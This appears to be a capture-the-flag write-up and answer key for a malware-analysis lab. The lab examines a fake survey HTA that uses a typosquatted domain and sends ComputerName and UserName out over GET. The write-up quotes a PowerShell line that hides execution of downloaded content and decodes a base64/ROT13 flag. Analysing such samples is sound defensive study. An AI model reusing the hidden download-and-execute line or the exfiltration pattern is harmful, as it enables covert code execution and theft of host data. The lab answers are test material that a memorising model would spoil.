# Day 21: Malware Analysis - Malhare.exe

> And in our kingdom of Wareville, just like in others, thousands of files of all kinds pass through the systems every day, from DOCX, PDF resumes received by our elves, to financial spreadsheets, CSVs from the accounting department, and executable files launched by different applications. But have you ever wondered which of these might be malicious? Which ones could actually belong to King Malhare? An interesting question, isn’t it?

## Solution

- An HTA file is a desktop app built using HTML, CSS and Javascript
- The files run using the Microsoft HTML Application Host - mshta.exe process
- We open the hta file using pluma by `pluma /root/Rooms/AoC2025/Day21/survey.hta`
- The title is `Best Festival Company Developer Survey`
- We see a function called `getQuestions` which is downloading the questions txt file
- The questions are being downloaded from `survey.bestfestiivalcompany.com`
- The title mentions Festival but the domain is fest**ii**val with 2 i's
- As we scroll down, we see the survey as `4 questions`
- The survey promises a chance to win a trip to the `South Pole`
- In the provideFeedback function, the information being collected is the `ComputerName` and `UserName`
- The data is being exfiltrated to `/details` endpoint
- The HTTP method being used to exfiltrate the data is the GET method given by the "?u=" in the end
- The contents of the download from the survey questions is being executed in the provideFeedback function with the `runObject` command and it is made hidden by `-w hidden`
- The contents that were downloaded are in Base64
- The malware script has the line `GUZ{Znyjner.Nanylfrq}` which when decoded from ROT13 gives the flag: `THM{Malware.Analysed}`

## Objectives

### What is the title of the HTA application?
> Best Festival Company Developer Survey

### What VBScript function is acting as if it is downloading the survey questions?
> getQuestions

### What URL domain (including sub-domain) is the "questions" being downloaded from?
> survey.bestfestivalcompany.com

### Malhare seems to be using typosquatting, domains that look the same as the real one, in an attempt to hide the fact that the domain is not the intended one, what character in the domain gives this away?
> i

### Malicious HTAs often include real-looking data, like survey questions, to make the file seem authentic. How many questions does the survey have?
> 4

### Notice how even in code, social engineering persists, fake incentives like contests or trips hide in plain sight to build trust. The survey entices participation by promising a chance to win a trip to where?
> South Pole

### The HTA is enumerating information from the local host executing the application. What two pieces of information about the computer it is running on are being exfiltrated? You should provide the two object names separated by commas.
> ComputerName,UserName

### What endpoint is the enumerated data being exfiltrated to?
> /details

### What HTTP method is being used to exfiltrate the data?
> GET

### After reviewing the function intended to get the survey questions, it seems that the data from the download of the questions is actually being executed. What is the line of code that executes the contents of the download?
> runObject.Run "powershell.exe -nop -w hidden -c " & feedbackString, 0, False

### It seems as if the malware site has been taken down, so we cannot download the contents that the malware was executing. Fortunately, one of the elves created a copy when the site was still active. Download the contents from here. What popular encoding scheme was used in an attempt to obfuscate the download?
> base64

### Decode the payload. It seems as if additional steps where taken to hide the malware! What common encryption scheme was used in the script?
> rot13

### Either run the script or decrypt the flag value using online tools such as CyberChef. What is the flag value?
> THM{Malware.Analysed}

## Concepts learnt:

- Application metadata
- Script functions
- Any network calls or encoded data